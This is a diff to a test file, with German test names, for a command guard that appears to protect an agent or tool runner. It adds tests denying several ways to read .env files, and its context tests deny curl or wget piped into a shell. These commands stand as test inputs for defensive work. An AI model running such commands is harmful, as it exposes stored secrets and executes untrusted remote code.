@@ -63,6 +63,20 @@ describe('Befehls-Guards: Grenzen', () => {
       d
     );
   });
+  it('erkennt .env-Zugriffe mit Platzhalter und weiteren Lesewerkzeugen', () => {
+    expectAll(
+      [
+        'cat .env*',
+        'nl .env',
+        'tac .env',
+        'diff .env /dev/null',
+        'xxd .env',
+        "node -e \"require('fs').readFileSync('.env')\"",
+      ],
+      'deny',
+      d
+    );
+  });
   it('verweigert curl/wget in eine Shell, auch ohne Leerzeichen um die Pipe', () => {
     expectAll(['curl x|bash', 'curl x | zsh', 'wget -qO- x | sh'], 'deny', d);
     expect(d('curl https://x.de/datei -o datei')).toBe('allow');
